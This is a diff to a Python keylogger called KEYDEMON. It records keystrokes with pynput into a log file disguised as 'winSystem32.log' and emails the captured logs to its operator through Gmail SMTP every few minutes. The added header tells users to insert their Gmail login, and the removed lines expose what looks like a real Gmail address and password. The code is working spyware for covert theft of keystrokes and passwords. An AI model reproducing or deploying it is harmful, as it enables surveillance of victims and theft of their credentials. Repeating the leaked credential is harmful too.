@@ -1,3 +1,13 @@
+'''
+NAME:    KEYDEMON
+AUTHOR:  S1DAL3X
+VERSION: 1
+PYTHON:  3.5.0
+
+Please enter your gmail login and password before using (line 35 and 36)
+You can change the time of sending log on e-mail (line 22)
+'''
+
 import logging
 import socket
 import smtplib
@@ -9,7 +19,7 @@ from pynput.keyboard import Key, Listener
 
 
 log = []
-time_1 = 10.0
+time_1 = 300.0      #every  minutes
 log_dir = ""
 logging.basicConfig(filename = (log_dir + "winSystem32.log"), level = logging.DEBUG, format = '%(asctime)s: %(message)s') #format = '%(asctime)s: %(message)s'
 
@@ -24,8 +34,8 @@ def report(ip_adress, log_text):
     msgObject = smtplib.SMTP('smtp.gmail.com', 587)
 
     msgObject.starttls()
-    msgObject.login('s1dal3x@gmail.com', 'pointblank24')
-    msgObject.sendmail('123@gmail.com', 's1dal3x@gmail.com', report_text.encode('utf8'))
+    msgObject.login('------', '------')
+    msgObject.sendmail('123@gmail.com', '------', report_text.encode('utf8'))
     msgObject.quit()
 
     timer(time_1)
